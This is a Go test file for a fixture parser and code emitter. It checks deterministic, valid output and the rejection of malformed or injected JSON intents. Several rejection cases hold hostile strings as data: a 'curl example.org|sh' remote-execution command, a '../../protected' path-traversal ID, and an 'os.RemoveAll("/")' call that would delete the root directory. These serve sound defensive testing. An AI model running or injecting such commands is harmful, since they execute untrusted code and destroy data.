package main
import (
 "bytes"
 "encoding/json"
 "go/parser"
 "go/token"
 "strings"
 "testing"
)
func TestR069FixturePreflightAndDeterministicCompile(t *testing.T){
 for _,suite:=range []string{"path-boundaries","strict-json"}{
  t.Run(suite,func(t *testing.T){
   raw,err:=fixture(suite);if err!=nil{t.Fatal(err)}
   intent,err:=parse(raw,suite);if err!=nil{t.Fatal(err)}
   if len(intent.Cases)!=4{t.Fatalf("missing exact fixture controls %+v",intent)}
   emitted:=emit(intent)
   if !strings.Contains(emitted,"TestR069IntentQualified")||!strings.Contains(emitted,"t.Run(\""+pivotal[suite]+"\""){
    t.Fatal("no pivotal source-only executable test")
   }
   f,err:=parser.ParseFile(token.NewFileSet(),"r069_generated_test.go",emitted,parser.AllErrors)
   if err!=nil||f.Name.Name!="main"{t.Fatalf("emitted code not Go: %v",err)}
   if emitted!=emit(intent){t.Fatal("nondeterministic emitter")}
  })
 }
}
func TestR069StrictJSONRejectsModelInjection(t *testing.T){
 good,err:=fixture("path-boundaries");if err!=nil{t.Fatal(err)}
 goodString:=string(good)
 bads:=[]struct{name,raw string}{
  {"duplicate-object-key",strings.Replace(goodString,"\"Schema\":","\"Schema\":\"wrong\",\"Schema\":",1)},
  {"trailing-document",goodString+" {}"},
  {"unknown-field",strings.Replace(goodString,"\"Suite\":","\"ArbitraryShell\":\"curl example.org|sh\",\"Suite\":",1)},
  {"wrong-oracle",strings.Replace(goodString,"\"Expect\":\"true\"","\"Expect\":\"false\"",1)},
  {"unknown-case",strings.Replace(goodString,"\"ID\":\"subtree\"","\"ID\":\"../../protected\" ",1)},
  {"duplicate-case",strings.Replace(goodString,"\"ID\":\"absolute\"","\"ID\":\"subtree\"",1)},
  {"no-pivotal",strings.Replace(goodString,"\"ID\":\"subtree\"","\"ID\":\"sibling\"",1)},
  {"wrong-suite",strings.Replace(goodString,"\"Suite\":\"path-boundaries\"","\"Suite\":\"strict-json\"",1)},
  {"oversize",strings.Repeat("x",4097)},
 }
 for _,tc:=range bads{
  t.Run(tc.name,func(t *testing.T){
   if _,err:=parse([]byte(tc.raw),"path-boundaries");err==nil{t.Fatalf("unsafe intent admitted: %s",tc.name)}
  })
 }
 if _,err:=parse(good,"path-boundaries");err!=nil{t.Fatal(err)}
}
func TestR069NoGenerativeCodeInSource(t *testing.T){
 valid,err:=fixture("strict-json");if err!=nil{t.Fatal(err)}
 var in Intent
 if err:=json.Unmarshal(valid,&in);err!=nil{t.Fatal(err)}
 in.Cases[0].ID="os.RemoveAll(\"/\")"
 corrupt,err:=json.Marshal(in);if err!=nil{t.Fatal(err)}
 if _,err:=parse(corrupt,"strict-json");err==nil{t.Fatal("untrusted code string treated as case ID")}
 expected,err:=fixture("strict-json");if err!=nil{t.Fatal(err)}
 if !bytes.Equal(valid,expected){t.Fatal("fixture should not mutate across tests")}
}
